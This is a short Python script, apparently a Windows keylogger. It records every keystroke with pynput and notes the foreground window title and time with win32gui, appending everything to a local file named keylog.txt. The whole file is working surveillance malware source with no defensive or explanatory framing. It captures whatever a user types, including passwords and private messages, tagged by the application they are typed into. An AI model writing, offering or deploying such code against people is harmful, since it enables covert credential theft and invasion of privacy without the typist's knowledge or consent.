from pynput import keyboard
import win32gui
import time

log_file = "keylog.txt"
char_count = 0
last_window = None

def get_active_window_title():
    window = win32gui.GetForegroundWindow()
    return win32gui.GetWindowText(window)

def on_press(key):
    global char_count, last_window

    current_window = get_active_window_title()

    if current_window != last_window:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"\n\n[Window: {current_window} - {time.strftime('%H:%M:%S')}]\n")
        last_window = current_window

    try:
        char = key.char
    except AttributeError:
        char = f"[{key}]"

    with open(log_file, "a", encoding="utf-8") as f:
        f.write(char)
        char_count += len(char)
        if char_count >= 75:
            f.write("\n")
            char_count = 0

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
